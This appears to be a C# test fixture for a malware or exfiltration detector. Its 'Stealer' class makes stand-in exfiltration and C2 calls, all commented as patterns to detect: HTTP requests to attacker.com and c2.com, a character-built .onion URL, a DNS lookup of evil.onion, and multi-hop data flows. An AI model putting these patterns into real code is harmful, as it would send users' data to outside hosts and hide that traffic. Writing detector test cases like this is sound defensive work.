using System;
using System.Net.Http;

public class Stealer
{
    public async void StealData()
    {
        // ✅ Pattern 1: Direct suspicious URL → API call
        string url = "http://attacker.com/exfiltrate";
        using (var client = new HttpClient())
        {
            await client.GetAsync(url);  // ← Should detect!
        }
    }

    public void CharObfuscation()
    {
        // ✅ Pattern 3: Char building
        char h = 'h';
        char t = 't';
        char t2 = 't';
        char p = 'p';
        char o = 'o';
        char n = 'n';
        char i = 'i';
        char dot = '.';
        
        string proto = $"{h}{t}{t2}{p}://malware{dot}{o}{n}{i}on/c2";
        using (var client = new HttpClient())
        {
            var request = new HttpRequestMessage(HttpMethod.Post, proto);
            client.SendAsync(request).Wait();
        }
    }

    public void DnsC2()
    {
        // ✅ Pattern 1: DNS lookup to C2 domain
        string c2Domain = "evil.onion";
        System.Net.Dns.GetHostAddresses(c2Domain);
    }

    public void Base64Exfil()
    {
        // ✅ Pattern 1: Suspicious Base64 + API call
        string encodedPayload = "VGhpcyBpcyBhIGxvbmcgYmFzZTY0IGVuY29kZWQgcGF5bG9hZCB0aGF0IGlzIHN1c3BpY2lvdXM=";
        using (var client = new HttpClient())
        {
            var content = new StringContent(encodedPayload);
            client.PostAsync("http://c2.com/upload", content);
        }
    }

    public void PrivateIPExfil()
    {
        // ✅ Pattern 1: Private IP → API call
        string internalServer = "192.168.1.100:8080";
        using (var client = new HttpClient())
        {
            client.GetAsync($"http://{internalServer}/data");
        }
    }

    public void ManyHops(string s)
    {
        // ✅ Pattern 2: Many hops (s → d → f → g → API call)
        string result = ss(s);
        using (var client = new HttpClient())
        {
            var content = new StringContent(result);
            client.PostAsync("http://api.google.xyz/upload", content);
        }
    }

    public string ss(string s)
    {
        return d(s);
    }
    public string d(string s)
    {
        return f(s);
    }
    public string f(string s)
    {
        return g(s);
    }
    public string g(string s)
    {
        return s;
    }
}